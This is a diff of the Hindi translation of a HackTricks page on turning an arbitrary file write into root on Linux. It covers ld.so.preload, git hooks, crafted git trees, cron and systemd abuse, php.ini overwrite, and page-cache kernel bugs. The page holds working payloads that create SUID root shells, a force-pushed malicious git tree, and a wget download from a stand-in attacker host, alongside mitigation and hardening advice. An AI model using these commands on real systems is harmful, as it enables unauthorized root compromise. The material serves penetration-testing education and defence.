@@ -1,11 +1,11 @@
-# Root के लिए मनमानी File Write
+# Root में Arbitrary File Write
 
 {{#include ../../banners/hacktricks-training.md}}
 
 ### /etc/ld.so.preload
 
-`/etc/ld.so.preload` shared objects की एक system-wide सूची है, जिसे dynamic linker अन्य shared objects से पहले load करता है। Secure-execution mode preloading पर अतिरिक्त प्रतिबंध लागू करता है, इसलिए `/tmp/pe.so` जैसा library path सार्वभौमिक SUID-binary technique नहीं है।\
-यदि आप इसे create या modify कर सकते हैं, तो इस file को load करने वाली process अन्य shared objects से पहले सूचीबद्ध library को load करेगी, जिससे उस process के context में code execution संभव हो जाता है।<sup>[[12]](#references)</sup>
+`/etc/ld.so.preload` shared objects की एक system-wide list है, जिसे dynamic linker अन्य shared objects से पहले load करता है। Secure-execution mode preloading पर अतिरिक्त restrictions लागू करता है, इसलिए `/tmp/pe.so` जैसा library path universal SUID-binary technique नहीं है।\
+यदि आप इसे create या modify कर सकते हैं, तो इस file को load करने वाली process अपनी अन्य shared objects से पहले सूचीबद्ध library को load करेगी, जिससे उस process के context में code execution संभव हो जाता है।<sup>[[12]](#references)</sup>
 
 उदाहरण के लिए: `echo "/tmp/pe.so" > /etc/ld.so.preload`
 ```c
@@ -25,41 +25,71 @@ system("/bin/bash");
 ```
 ### Git hooks
 
-**Git hooks** किसी repository में होने वाली घटनाओं के लिए चलने वाली executable scripts होती हैं, जिनमें commit और merge operations शामिल हैं। यदि कोई **privileged script या user** ये actions करता है और attacker **`.git` folder में लिख** सकता है, तो hook का उपयोग **privilege escalation** के लिए किया जा सकता है।<sup>[[13]](#references)</sup>
+**Git hooks** किसी repository में होने वाली घटनाओं के लिए चलने वाली executable scripts होती हैं, जिनमें commit और merge operations शामिल हैं। यदि कोई **privileged script or user** ये actions करता है और attacker **`.git` folder** में **write** कर सकता है, तो hook का उपयोग **privilege escalation** के लिए किया जा सकता है।<sup>[[13]](#references)</sup>
 
-उदाहरण के लिए, किसी git repo में **`.git/hooks`** के अंदर **एक script बनाना** संभव है, ताकि नया commit बनाए जाने पर वह हमेशा execute हो:
+उदाहरण के लिए, किसी git repo में **`.git/hooks`** के अंदर एक **script generate** करना संभव है, ताकि नया commit बनाए जाने पर वह हमेशा execute हो:
 ```bash
 echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
 chmod +x pre-commit
 ```
+### Privileged Git tree export path traversal
+
+कोई privileged synchronizer checkout से बचने के लिए attacker-influenced repository को `git ls-tree` से enumerate कर सकता है, प्रत्येक blob को `git cat-file` से पढ़ सकता है, reported pathname को staging directory के साथ join कर सकता है और स्वयं उसे लिख सकता है। जब यह `-c safe.directory=*` (Git के different-owner repository guard को disable करता है) को destination containment check के बिना combine करता है, तो यह **synchronizer के privileges के साथ arbitrary file write** बन जाता है। कोई absolute tree-entry name Python के `os.path.join(stage, name)` को `stage` छोड़ने पर मजबूर करता है; filesystem द्वारा resolve किए जाने पर `../` वाला relative name बाहर निकल जाता है। क्योंकि application Git से checkout करवाने के बजाय raw tree को materialize करती है, checkout-time pathname rejection कभी भी sink की सुरक्षा नहीं करती।<sup>[[30]](#references)[[32]](#references)[[33]](#references)</sup>
+
+Root services, timers, deployment agents, template importers और backup/restore jobs में इस code shape को खोजें:<sup>[[30]](#references)</sup>
+```python
+entries = git("-c", "safe.directory=*", "ls-tree", "-rz", "HEAD")
+for mode, oid, git_path in parse(entries):
+target = os.path.join(stage_root, git_path)  # no containment check
+os.makedirs(os.path.dirname(target), exist_ok=True)
+with open(target, "wb") as output:
+output.write(git("cat-file", "blob", oid))
+```
+एक tree entry को `<mode> SP <name> NUL <raw object ID>` के रूप में encode किया जाता है। `git hash-object --literally` विकल्प जानबूझकर ऐसे object data की अनुमति देता है जिसे सामान्य parsing या `git fsck` अस्वीकार कर सकते हैं, इसलिए एक disposable clone ऐसा tree बना सकता है जिसका filename एक absolute destination हो। यह उदाहरण एक cron-file blob बनाता है, crafted tree को एक commit में wrap करता है और एक branch को उस पर ले जाता है; exploitation के लिए अभी भी उस repository को update करने की permission आवश्यक है जिसे privileged job consume करता है, साथ ही ऐसे Git server की भी आवश्यकता है जो malformed object स्वीकार करे।<sup>[[30]](#references)[[31]](#references)</sup>
+```bash
+blob=$(printf '%s\n' '* * * * * root cp /bin/bash /tmp/rootbash && chmod 6755 /tmp/rootbash' | git hash-object -w --stdin)
+{ printf '100644 /etc/cron.d/git-sync\0'; printf '%s' "$blob" | xxd -r -p; } > tree.raw
+tree=$(git hash-object -w -t tree --literally --stdin < tree.raw)
+commit=$(printf 'crafted tree\n' | git commit-tree "$tree")
+git update-ref refs/heads/main "$commit"
+git ls-tree -r main
+git push --force origin main
+```
+Hardening में repository ingestion और final filesystem operation, दोनों को कवर करना आवश्यक है:<sup>[[30]](#references)[[33]](#references)[[34]](#references)</sup>
+
+- `safe.directory=*` को उन exact repositories से बदलें जिन पर service को trust करना आवश्यक है, और जहाँ संभव हो, repository processing को root privileges के बिना चलाएँ।
+- Materialization से पहले absolute names और किसी भी `.` या `..` component को अस्वीकार करें। Join करने के बाद canonicalize करें और verify करें कि destination intended root के भीतर ही रहे।
+- Check-then-open symlink races से बचें: trusted directory descriptor के सापेक्ष open करें और Linux पर attacker-controlled paths के लिए `RESOLVE_BENEATH` तथा `RESOLVE_NO_SYMLINKS` के साथ `openat2()` का उपयोग करें।
+- Plumbing output से checkout को फिर से implement करने के बजाय isolated directory में normal checkout को प्राथमिकता दें। यदि raw-object ingestion आवश्यक हो, तो `receive.fsckObjects=true` जैसी receive-side validation सक्षम करें; crafted trees को अस्वीकार करने के लिए आवश्यक pathname-related `receive.fsck.*` findings को downgrade न करें।
+
 ### Cron और Time files
 
-यदि आप **root द्वारा execute की जाने वाली cron-related files में write कर सकते हैं**, तो आमतौर पर अगली बार job चलने पर code execution प्राप्त कर सकते हैं। Interesting targets में शामिल हैं:<sup>[[14]](#references)[[20]](#references)</sup>
+यदि आप **ऐसी cron-related files लिख सकते हैं जिन्हें root execute करता है**, तो आमतौर पर अगली बार job चलने पर code execution प्राप्त किया जा सकता है। Interesting targets में शामिल हैं:<sup>[[14]](#references)[[20]](#references)</sup>
 
 - `/etc/crontab`
 - `/etc/cron.d/*`
 - `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
 - `/var/spool/cron/` या `/var/spool/cron/crontabs/` में root का अपना crontab
-- `systemd` timers और वे services जिन्हें वे trigger करते हैं
+- `systemd` timers और उनके द्वारा trigger की जाने वाली services
 
-त्वरित checks:
+त्वरित जाँचें:
 ```bash
 ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
 find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
 systemctl list-timers --all 2>/dev/null
 grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
 ```
-सामान्य दुरुपयोग के तरीके:
+सामान्य abuse paths:
 
-- `/etc/crontab` या `/etc/cron.d/` की किसी फ़ाइल में **एक नया root cron job जोड़ें**
-- `run-parts` द्वारा पहले से निष्पादित **किसी script को बदलें**
-- script या binary को संशोधित करके **किसी मौजूदा timer target में backdoor डालें**
+- **`/etc/crontab` या `/etc/cron.d/` की किसी फ़ाइल में नया root cron job जोड़ें**
+- **`run-parts` द्वारा पहले से execute की जाने वाली script को replace करें**
+- **मौजूदा timer target में backdoor जोड़ें, उस script या binary को modify करके जिसे वह launch करता है**
 
 न्यूनतम cron payload का उदाहरण:
 ```bash
 echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
 ```
-यदि आप केवल `run-parts` द्वारा उपयोग की जाने वाली cron directory के अंदर लिख सकते हैं, तो इसके बजाय वहां एक executable फ़ाइल रखें:
+यदि आप केवल `run-parts` द्वारा उपयोग की जाने वाली किसी cron directory के अंदर लिख सकते हैं, तो इसके बजाय वहां एक executable फ़ाइल डालें:
 ```bash
 cat > /etc/cron.daily/backup <<'EOF'
 #!/bin/sh
@@ -71,22 +101,22 @@ chmod +x /etc/cron.daily/backup
 ```
 नोट्स:
 
-- `run-parts` आमतौर पर ऐसे filenames को अनदेखा करता है जिनमें dots होते हैं, इसलिए `backup.sh` के बजाय `backup` जैसे नामों को प्राथमिकता दें।<sup>[[15]](#references)</sup>
-- कुछ systems classic cron के बजाय `systemd` timers का उपयोग करते हैं, लेकिन abuse का विचार वही है: **बाद में root द्वारा execute की जाने वाली चीज़ को modify करें**।<sup>[[20]](#references)</sup>
+- `run-parts` आमतौर पर dots वाले filenames को अनदेखा करता है, इसलिए `backup.sh` के बजाय `backup` जैसे names को प्राथमिकता दें।<sup>[[15]](#references)</sup>
+- कुछ systems classic cron के बजाय `systemd` timers का उपयोग करते हैं, लेकिन abuse idea वही रहता है: **बाद में root द्वारा execute की जाने वाली चीज़ को modify करना**।<sup>[[20]](#references)</sup>
 
 ### Service & Socket files
 
-यदि आप **`systemd` unit files** या उनके द्वारा reference की गई files में लिख सकते हैं, तो unit को reload और restart करके, या service/socket activation path के trigger होने की प्रतीक्षा करके, root के रूप में code execution प्राप्त कर सकते हैं।<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)</sup>
+यदि आप **`systemd` unit files** या उनमें referenced files में write कर सकते हैं, तो unit को reload और restart करके, या service/socket activation path के trigger होने की प्रतीक्षा करके root के रूप में code execution प्राप्त कर सकते हैं।<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)</sup>
 
-दिलचस्प targets में शामिल हैं:
+Interesting targets में शामिल हैं:
 
 - `/etc/systemd/system/*.service`
 - `/etc/systemd/system/*.socket`
 - `/etc/systemd/system/<unit>.d/*.conf` में Drop-in overrides
-- `ExecStart=`, `ExecStartPre=`, `ExecStartPost=` द्वारा referenced service scripts/binaries
-- root service द्वारा load किए गए writable `EnvironmentFile=` paths
+- `ExecStart=`, `ExecStartPre=`, `ExecStartPost=` द्वारा referenced Service scripts/binaries
+- Root service द्वारा load किए जाने वाले writable `EnvironmentFile=` paths
 
-त्वरित जाँच:
+त्वरित checks:
 ```bash
 ls -la /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
 systemctl list-units --type=service --all 2>/dev/null
@@ -95,12 +125,12 @@ grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /
 ```
 सामान्य abuse paths:
 
-- **`ExecStart=` को overwrite करें** ऐसे root-owned service unit में, जिसे आप modify कर सकते हैं
-- **एक drop-in override जोड़ें** जिसमें malicious `ExecStart=` हो, और पहले पुराने को clear करें
-- Unit द्वारा पहले से referenced script/binary में **Backdoor डालें**
-- **socket-activated service को hijack करें** संबंधित `.service` file को modify करके, जो socket को connection मिलने पर शुरू होती है
+- root-owned service unit में **`ExecStart=` को overwrite करें**, जिसे आप modify कर सकते हैं
+- malicious **`ExecStart=`** के साथ **drop-in override जोड़ें** और पहले पुराने को clear करें
+- unit द्वारा पहले से referenced script/binary में **backdoor डालें**
+- socket-activated service को hijack करें, corresponding `.service` file को modify करके, जो socket को connection मिलने पर start होती है
 
-उदाहरण malicious override:
+Malicious override का उदाहरण:
 ```ini
 [Service]
 ExecStart=
@@ -112,13 +142,13 @@ systemctl daemon-reload
 systemctl restart vulnerable.service
 # or trigger the socket-backed service by connecting to it
 ```
-यदि आप स्वयं services को restart नहीं कर सकते, लेकिन socket-activated unit को edit कर सकते हैं, तो आपको root के रूप में backdoored service का execution trigger करने के लिए केवल **client connection का इंतजार** करना पड़ सकता है।<sup>[[17]](#references)</sup>
+यदि आप services को स्वयं restart नहीं कर सकते, लेकिन socket-activated unit को edit कर सकते हैं, तो आपको backdoored service को root के रूप में execute कराने के लिए केवल **client connection का इंतज़ार करना** पड़ सकता है।<sup>[[17]](#references)</sup>
 
-### Privileged PHP sandbox द्वारा उपयोग की जाने वाली restrictive `php.ini` को overwrite करना
+### privileged PHP sandbox द्वारा उपयोग की जाने वाली restrictive `php.ini` को overwrite करना
 
-कुछ custom daemons user-supplied PHP को **restricted `php.ini`** के साथ `php` चलाकर validate करते हैं (उदाहरण के लिए, `disable_functions=exec,system,...`)। यदि sandboxed code में अभी भी **कोई write primitive** (जैसे `file_put_contents`) मौजूद है और आप daemon द्वारा उपयोग किए जाने वाले **exact `php.ini` path** तक पहुंच सकते हैं, तो आप restrictions हटाने के लिए उस config को **overwrite** कर सकते हैं और फिर elevated privileges के साथ चलने वाला दूसरा payload submit कर सकते हैं।<sup>[[2]](#references)</sup>
+कुछ custom daemons user-supplied PHP को **restricted `php.ini`** के साथ `php` चलाकर validate करते हैं (उदाहरण के लिए, `disable_functions=exec,system,...`)। यदि sandboxed code में अभी भी **कोई write primitive** (जैसे `file_put_contents`) मौजूद है और आप daemon द्वारा उपयोग किए जाने वाले **exact `php.ini` path** तक पहुँच सकते हैं, तो आप restrictions हटाने के लिए उस config को **overwrite** कर सकते हैं और फिर दूसरा payload submit कर सकते हैं, जो elevated privileges के साथ चलता है।<sup>[[2]](#references)</sup>
 
-सामान्य flow:
+Typical flow:
 
 1. पहला payload sandbox config को overwrite करता है।
 2. दूसरा payload अब code execute करता है, क्योंकि dangerous functions फिर से enabled हैं।
@@ -128,15 +158,15 @@ Minimal example (daemon द्वारा उपयोग किए जान�
 <?php
 file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
 ```
-यदि daemon root के रूप में चलता है (या root-owned paths से validation करता है), तो दूसरी execution से root context प्राप्त होता है। यह मूलतः **config overwrite के माध्यम से privilege escalation** है, जब sandboxed runtime अभी भी files में write कर सकता हो।
+यदि daemon root के रूप में चलता है (या root-owned paths के साथ validation करता है), तो दूसरा execution root context प्राप्त करता है। यह मूलतः **config overwrite के माध्यम से privilege escalation** है, जब sandboxed runtime अभी भी files लिख सकता है।
 
 ### binfmt_misc
 
-`binfmt_misc`, `/proc/sys/fs/binfmt_misc` के अंतर्गत registrations उपलब्ध कराता है; प्रत्येक registration एक file-type pattern को एक interpreter से जोड़ता है। इसका privilege impact इस बात पर निर्भर करता है कि registration को कौन बदल सकता है और matching file को बाद में कौन-सी process execute करती है, इसलिए इसे privilege-escalation path मानने से पहले इन requirements को verify करें।<sup>[[21]](#references)</sup>
+`binfmt_misc`, `/proc/sys/fs/binfmt_misc` के अंतर्गत registrations उपलब्ध कराता है; प्रत्येक registration एक file-type pattern को एक interpreter के साथ संबद्ध करता है। privilege impact इस बात पर निर्भर करता है कि registration को कौन बदल सकता है और बाद में matching file को कौन-सा process execute करता है, इसलिए इसे privilege-escalation path मानने से पहले इन requirements की पुष्टि करें।<sup>[[21]](#references)</sup>
 
 ### Overwrite schema handlers (like http: or https:)
 
-Desktop environments URI schemes के लिए application चुनने हेतु MIME associations और desktop entries का उपयोग करते हैं; relevant per-user configuration और desktop-entry directories में write कर सकने वाला attacker उन schemes को अपने नियंत्रण वाले launcher पर redirect कर सकता है। `$HOME/.config/mimeapps.list` file में HTTP और HTTPS URL handlers को किसी malicious file पर point करके (उदाहरण के लिए, `x-scheme-handler/http=evil.desktop` और `x-scheme-handler/https=evil.desktop`), user का click उस desktop entry को invoke कर सकता है।<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>
+Desktop environments URI schemes के लिए application चुनने हेतु MIME associations और desktop entries का उपयोग करते हैं; relevant per-user configuration और desktop-entry directories में write कर सकने वाला attacker उन schemes को अपने नियंत्रण वाले launcher पर redirect कर सकता है। `$HOME/.config/mimeapps.list` file को संशोधित करके HTTP और HTTPS URL handlers को किसी malicious file पर point करने पर (उदाहरण के लिए, `x-scheme-handler/http=evil.desktop` और `x-scheme-handler/https=evil.desktop`), user click उस desktop entry को invoke कर सकता है।<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>
 ```bash
 [Desktop Entry]
 Type=Application
@@ -146,16 +176,16 @@ MimeType=x-scheme-handler/http;x-scheme-handler/https;
 ```
 ### Root द्वारा user-writable scripts/binaries का execution
 
-यदि कोई privileged workflow `/bin/sh /home/username/.../script` जैसी किसी चीज़ को चलाता है (या unprivileged user के स्वामित्व वाली directory के अंदर मौजूद कोई binary), तो आप उसे hijack कर सकते हैं:<sup>[[1]](#references)</sup>
+यदि कोई privileged workflow `/bin/sh /home/username/.../script` जैसी किसी चीज़ को चलाता है (या unprivileged user के स्वामित्व वाली directory के अंदर मौजूद कोई binary चलाता है), तो आप इसे hijack कर सकते हैं:<sup>[[1]](#references)</sup>
 
-- **Execution का पता लगाएँ:** root द्वारा user-controlled paths को invoke करने का पता लगाने के लिए pspy से processes monitor करें।<sup>[[25]](#references)</sup>
+- **Execution detect करें:** root द्वारा user-controlled paths को invoke करने का पता लगाने के लिए pspy से processes monitor करें।<sup>[[25]](#references)</sup>
 ```bash
 wget http://attacker/pspy64 -O /dev/shm/pspy64
 chmod +x /dev/shm/pspy64
 /dev/shm/pspy64   # wait for root commands pointing to your writable path
 ```
-- **Writeability की पुष्टि करें:** सुनिश्चित करें कि target file और उसकी directory दोनों आपके user के स्वामित्व में हों और आपके user द्वारा writable हों।
-- **Target को Hijack करें:** original binary/script का backup लें और ऐसा payload डालें जो SUID shell (या कोई अन्य root action) बनाए, फिर permissions restore करें:
+- **Writeability की पुष्टि करें:** सुनिश्चित करें कि target file और उसकी directory दोनों आपके user के स्वामित्व में हों और आपके user के लिए writable हों।
+- **Target को hijack करें:** original binary/script का backup लें और ऐसा payload डालें जो SUID shell (या कोई अन्य root action) बनाए, फिर permissions restore करें:
 ```bash
 mv server-command server-command.bk
 cat > server-command <<'EOF'
@@ -166,53 +196,53 @@ chmod 6777 /tmp/rootshell
 EOF
 chmod +x server-command
 ```
-- **privileged action को trigger करें** (जैसे, helper को spawn करने वाले UI button को दबाना)। जब root hijacked path को फिर से execute करे, तो `./rootshell -p` से escalated shell प्राप्त करें।
+- **privileged action को trigger करें** (जैसे helper को spawn करने वाले UI button को दबाना)। जब root hijacked path को दोबारा execute करे, तो `./rootshell -p` से escalated shell प्राप्त करें।
 
-### privileged binaries का केवल page-cache modification
+### Privileged binaries के page-cache-only file modification
 
-कुछ kernel bugs फ़ाइल को **disk पर** modify नहीं करते। इसके बजाय, वे आपको केवल किसी readable फ़ाइल की **page cache copy** को modify करने देते हैं। यदि आप किसी **setuid** या अन्यथा **root-executed** binary को target कर सकते हैं, तो अगला execution memory से attacker-controlled bytes चला सकता है और privileges escalate कर सकता है, भले ही disk पर फ़ाइल hash अपरिवर्तित हो।<sup>[[3]](#references)[[4]](#references)</sup>
+कुछ kernel bugs file को **disk पर** modify नहीं करते। इसके बजाय, वे आपको readable file की केवल **page cache copy** को modify करने देते हैं। यदि आप किसी **setuid** या अन्यथा **root-executed** binary को target कर सकते हैं, तो अगला execution memory से attacker-controlled bytes चला सकता है और privileges escalate कर सकता है, भले ही disk पर file hash अपरिवर्तित हो।<sup>[[3]](#references)[[4]](#references)</sup>
 
 इसे **runtime-only file write primitive** के रूप में समझना उपयोगी है:<sup>[[3]](#references)</sup>
 
-- **Disk clean रहता है**: inode और disk पर मौजूद bytes नहीं बदलते
-- **Memory dirty हो जाती है**: cached page को read/execute करने वाली processes को attacker-modified content मिलता है
-- **Effect अस्थायी होता है**: reboot या cache eviction के बाद बदलाव गायब हो जाता है
+- **Disk साफ रहता है**: inode और disk पर मौजूद bytes नहीं बदलते
+- **Memory dirty होती है**: cached page को पढ़ने या execute करने वाली processes को attacker-modified content मिलता है
+- **प्रभाव अस्थायी होता है**: reboot या cache eviction के बाद बदलाव गायब हो जाता है
 
 यह primitive classic **arbitrary file write** और Dirty COW / Dirty Pipe जैसे पुराने **page-cache abuse** bugs के बीच आता है:<sup>[[3]](#references)</sup>
 
 - Dirty COW एक race पर निर्भर था
 - Dirty Pipe में write-position constraints थीं
-- यदि vulnerable path cached file-backed pages में direct writes की अनुमति देता है, तो page-cache-only primitive अधिक reliable हो सकता है
+- यदि vulnerable path cached file-backed pages में direct writes की सुविधा देता है, तो page-cache-only primitive अधिक reliable हो सकता है
 
 #### Generic privesc flow
 
 1. ऐसा kernel primitive प्राप्त करें जो **file-backed page cache pages** में write कर सके
-2. इसका उपयोग किसी **readable privileged binary** या root द्वारा execute की जाने वाली अन्य फ़ाइल पर करें
+2. इसका उपयोग किसी **readable privileged binary** या किसी अन्य root-executed file पर करें
 3. Page के cache से evict होने से **पहले** execution trigger करें
-4. जब disk पर मौजूद फ़ाइल अभी भी unmodified दिखाई दे रही हो, तब root के रूप में code execution प्राप्त करें
+4. On-disk file के अपरिवर्तित दिखने के बावजूद root के रूप में code execution प्राप्त करें
 
 Typical high-value targets:
 
 - **setuid-root** binaries
-- **root services** द्वारा launch किए जाने वाले helpers
-- **host kernel/page cache share करने वाले containers** से आम तौर पर execute की जाने वाली binaries
+- **root services** द्वारा launch किए जाने वाले Helpers
+- **host kernel/page cache को share करने वाले containers** से सामान्यतः execute की जाने वाली binaries
 
 #### AF_ALG + `splice()` example path
 
 Copy Fail (CVE-2026-31431) इस class का अच्छा उदाहरण है। Vulnerable path Linux crypto userspace API (`AF_ALG` / `algif_aead`) में था:<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>
 
-- `splice()` किसी readable फ़ाइल से page-cache pages के references को crypto TX scatterlist में move कर सकता है
-- in-place `algif_aead` decrypt path ने source और destination buffers को reuse किया
-- इसके बाद `authencesn` ने destination tag region में write किया
-- जब वह region अभी भी spliced file-backed pages को reference कर रहा था, तो write target फ़ाइल के **page cache** में पहुंच गई
+- `splice()` readable file से page-cache pages के references को crypto TX scatterlist में ले जा सकता है
+- in-place `algif_aead` decrypt path ने source और destination buffers का पुनः उपयोग किया
+- `authencesn` ने इसके बाद destination tag region में write किया
+- जब वह region अभी भी spliced file-backed pages को reference कर रहा था, तो write target file के **page cache** में चला गया
 
-इसलिए interesting technique स्वयं CVE नहीं है, बल्कि pattern है:
+इसलिए interesting technique स्वयं CVE नहीं, बल्कि यह pattern है:
 
 - **file-backed cache pages को किसी kernel subsystem में feed करें**
 - subsystem को उन्हें **writable output** के रूप में treat करने दें
-- memory में छोटा controlled overwrite trigger करें
+- memory में एक छोटा controlled overwrite trigger करें
 
-Public PoC ने `/usr/bin/su` को memory में patch करने के लिए repeated **4-byte writes** का उपयोग किया और फिर उसे execute किया।<sup>[[4]](#references)[[7]](#references)</sup>
+Public PoC ने `/usr/bin/su` को memory में patch करने के लिए बार-बार **4-byte writes** का उपयोग किया और फिर उसे execute किया।<sup>[[4]](#references)[[7]](#references)</sup>
 
 #### ESP / XFRM + netfilter TEE clone example path
 
@@ -223,21 +253,21 @@ DirtyClone (CVE-2026-43503) इसी **page-cache-only write-to-root** pattern 
 - `splice()` एक **read-only file-backed page-cache page** को ESP-in-UDP packet में रखता है
 - मूल DirtyFrag mitigation ने उस skb को `SKBFL_SHARED_FRAG` से tag किया, ताकि `esp_input()` decrypt करने से **पहले copy** करे
 - netfilter `TEE` packet को `nf_dup_ipv4()` -> `__pskb_copy_fclone()` के माध्यम से duplicate करता है
-- clone वही **physical page-cache reference** रखता है, लेकिन `SKBFL_SHARED_FRAG` खो देता है
-- इसके बाद `esp_input()` clone को safe मानता है और file-backed page पर **in-place `cbc(aes)` decrypt** चलाता है
+- clone वही **physical page-cache reference** बनाए रखता है, लेकिन `SKBFL_SHARED_FRAG` खो देता है
+- इसके बाद `esp_input()` clone को सुरक्षित मानता है और file-backed page पर in-place `cbc(aes)` decrypt चलाता है
 
-इसलिए reviewer lesson CVE से व्यापक है: यदि कोई mitigation यह तय करने के लिए **skb/page metadata** पर निर्भर करती है कि किसी operation को पहले copy करना आवश्यक है या नहीं, तो backing page को बनाए रखने लेकिन metadata को हटा देने वाला कोई भी **clone/copy path** अनजाने में write primitive को फिर से खोल सकता है।
+इसलिए reviewer के लिए lesson CVE से व्यापक है: यदि कोई mitigation यह तय करने के लिए **skb/page metadata** पर निर्भर करती है कि operation को पहले copy करना आवश्यक है या नहीं, तो backing page को बनाए रखने वाला लेकिन metadata को हटा देने वाला कोई भी **clone/copy path** चुपचाप write primitive को फिर से खोल सकता है।
 
 Typical exploitation flow:
 
 1. Private network namespace के अंदर **`CAP_NET_ADMIN`** प्राप्त करने के लिए `unshare(CLONE_NEWUSER | CLONE_NEWNET)` चलाएं
-2. loopback को up करें और `mangle/OUTPUT` में netfilter `TEE` rule install करें
+2. Loopback को up करें और `mangle/OUTPUT` में **netfilter `TEE` rule** install करें
 3. `NETLINK_XFRM` के माध्यम से **XFRM ESP transport SAs** install करें
 4. प्रत्येक target 4-byte word को SA के `seq_hi` field में encode करें (DirtyFrag की word-selection trick)
-5. spliced ESP-in-UDP packet भेजें, ताकि **TEE clone** `esp_input()` तक पहुंचे और **in place** decrypt करे
-6. तब तक repeat करें, जब तक `/usr/bin/su` या किसी अन्य privileged executable की page-cache copy में attacker-controlled code न आ जाए
+5. Spliced ESP-in-UDP packet भेजें, ताकि **TEE clone** `esp_input()` तक पहुंचे और **in place** decrypt करे
+6. तब तक दोहराएं जब तक `/usr/bin/su` या किसी अन्य privileged executable की page-cache copy में attacker-controlled code न आ जाए
 
-Operationally, impact `AF_ALG` example जैसा ही है: disk पर फ़ाइल clean रहती है, लेकिन `execve()` **mutated page-cache bytes** को consume करता है और root access प्रदान करता है।<sup>[[8]](#references)[[9]](#references)</sup>
+Operationally, impact `AF_ALG` example जैसा ही है: disk पर file साफ रहती है, लेकिन `execve()` **mutated page-cache bytes** का उपयोग करता है और root प्राप्त होता है।<sup>[[8]](#references)[[9]](#references)</sup>
 
 इस variant के लिए उपयोगी exposure checks:
 ```bash
@@ -248,7 +278,7 @@ modprobe -n -v esp4 2>/dev/null
 modprobe -n -v esp6 2>/dev/null
 lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
 ```
-यहाँ short-term attack-surface reduction भी path-specific है: `48f6a5356a33` वाला kernel upgrade करने से clone path ठीक हो जाता है, जबकि `xt_TEE` autoload को block करने से **flag-laundering step** हट जाता है और `esp4` / `esp6` को block करने से **decrypt sink** हट जाता है।<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>
+यहाँ अल्पकालिक attack-surface reduction भी path-specific है: `48f6a5356a33` वाला kernel upgrade करने से clone path ठीक हो जाता है, जबकि `xt_TEE` autoload को block करने से **flag-laundering step** हट जाता है और `esp4` / `esp6` को block करने से **decrypt sink** हट जाता है।<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>
 
 #### Exposure और hunting
 
@@ -263,24 +293,24 @@ find / -perm -4000 -type f 2>/dev/null
 
 - `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` को module के रूप में load/unload किया जा सकता है
 - `CONFIG_CRYPTO_USER_API_AEAD=y`: interface kernel में built-in है
-- setuid binaries अच्छे targets होते हैं क्योंकि page-cache-only patch किसी local foothold को root में बदलने के लिए पर्याप्त हो सकता है
+- setuid binaries अच्छे targets हैं, क्योंकि केवल page-cache-only patch ही local foothold को root में बदलने के लिए पर्याप्त हो सकता है
 
-#### `algif_aead` path के लिए Attack-surface reduction
+#### `algif_aead` path के लिए attack-surface reduction
 
-यदि vulnerable interface किसी loadable module द्वारा प्रदान किया गया है:<sup>[[6]](#references)[[28]](#references)[[29]](#references)</sup>
+यदि vulnerable interface किसी loadable module द्वारा प्रदान किया जाता है:<sup>[[6]](#references)[[28]](#references)[[29]](#references)</sup>
 ```bash
 echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
 rmmod algif_aead 2>/dev/null || true
 ```
-यदि इसे kernel में compile किया गया है, तो कुछ disclosures में init path के block होने की सूचना दी गई है:<sup>[[28]](#references)</sup>
+यदि इसे kernel में compile किया गया है, तो कुछ disclosures में init path को निम्नलिखित के साथ block करने की जानकारी दी गई है:<sup>[[28]](#references)</sup>
 ```bash
 initcall_blacklist=algif_aead_init
 ```
-इस तरह का mitigation अन्य kernel LPEs के लिए भी याद रखने योग्य है: यदि exploitation किसी विशिष्ट optional interface पर निर्भर करता है, तो उस interface को disabling या blacklisting करने से full kernel upgrade उपलब्ध होने से पहले ही exploit path बाधित हो सकता है।<sup>[[6]](#references)[[28]](#references)</sup>
+इस प्रकार के mitigation को अन्य kernel LPEs के लिए भी याद रखना उपयोगी है: यदि exploitation किसी विशिष्ट optional interface पर निर्भर करता है, तो उस interface को disable या blacklist करने से full kernel upgrade उपलब्ध होने से पहले ही exploit path को रोका जा सकता है।<sup>[[6]](#references)[[28]](#references)</sup>
 
 ## References
 
-- [1] [HTB Bamboo – user-writable PaperCut directory में root द्वारा चलाए जाने वाले script को hijack करना](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
+- [1] [HTB Bamboo – user-writable PaperCut directory में root-executed script को hijack करना](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
 - [2] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
 - [3] [Tenable: Copy Fail (CVE-2026-31431) FAQ](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
 - [4] [CVE-2026-31431 के लिए Openwall oss-security disclosure](https://www.openwall.com/lists/oss-security/2026/04/29/23)
@@ -300,7 +330,7 @@ initcall_blacklist=algif_aead_init
 - [18] [systemd.unit](https://github.com/systemd/systemd/blob/main/man/systemd.unit.xml)
 - [19] [systemd.exec](https://github.com/systemd/systemd/blob/main/man/systemd.exec.xml)
 - [20] [systemd.timer](https://github.com/systemd/systemd/blob/main/man/systemd.timer.xml)
